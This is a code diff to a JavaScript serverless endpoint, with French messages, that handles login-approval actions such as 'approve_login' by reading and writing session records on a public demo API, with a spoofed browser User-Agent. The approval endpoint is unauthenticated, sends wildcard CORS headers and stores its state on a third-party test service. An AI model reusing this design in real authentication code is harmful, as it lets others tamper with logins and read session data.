@@ -1,22 +1,57 @@
+const FETCH_HEADERS = {
+  'Content-Type': 'application/json',
+  'Accept': 'application/json',
+  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+};
+
 export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Origin', '*');
   res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  const { id, action } = req.query || {};
+  let id = '';
+  let action = '';
+  let sessionId = '';
 
-  if (!id || !action) {
+  if (req.query && typeof req.query === 'object') {
+    id = req.query.id || '';
+    action = req.query.action || '';
+    sessionId = req.query.sessionId || '';
+  }
+
+  if ((!id || !action) && req.url) {
+    try {
+      const parsedUrl = new URL(req.url, 'http://localhost');
+      id = id || parsedUrl.searchParams.get('id') || '';
+      action = action || parsedUrl.searchParams.get('action') || '';
+      sessionId = sessionId || parsedUrl.searchParams.get('sessionId') || '';
+    } catch {}
+  }
+
+  const targetId = id || sessionId;
+
+  if (!targetId || !action) {
     return res.status(400).send('<h3>Paramètres manquants (id et action requis).</h3>');
   }
 
   try {
-    const fetchRes = await fetch(`https://api.restful-api.dev/objects/${id}`);
-    if (!fetchRes.ok) {
-      return res.status(404).send('<h3>Session non trouvée ou expirée.</h3>');
+    let currentRecord = null;
+    let isExisting = false;
+
+    try {
+      const fetchRes = await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
+        headers: FETCH_HEADERS,
+        cache: 'no-store',
+      });
+      if (fetchRes.ok) {
+        currentRecord = await fetchRes.json();
+        isExisting = true;
+      }
+    } catch (e) {
+      console.warn('Action lookup warning:', e);
     }
 
-    const currentRecord = await fetchRes.json();
-    const data = currentRecord.data || {};
+    const data = currentRecord?.data || {};
 
     let title = '';
     if (action === 'approve_login') {
@@ -35,14 +70,28 @@ export default async function handler(req, res) {
 
     data.lastUpdated = Date.now();
 
-    await fetch(`https://api.restful-api.dev/objects/${id}`, {
-      method: 'PUT',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        name: currentRecord.name || id,
-        data,
-      }),
-    });
+    if (isExisting) {
+      await fetch(`https://api.restful-api.dev/objects/${targetId}`, {
+        method: 'PUT',
+        headers: FETCH_HEADERS,
+        body: JSON.stringify({
+          name: currentRecord.name || targetId,
+          data,
+        }),
+      });
+    } else {
+      await fetch(`https://api.restful-api.dev/objects`, {
+        method: 'POST',
+        headers: FETCH_HEADERS,
+        body: JSON.stringify({
+          name: targetId,
+          data: {
+            sessionId: targetId,
+            ...data,
+          },
+        }),
+      });
+    }
 
     return res.status(200).send(`
       <!DOCTYPE html>
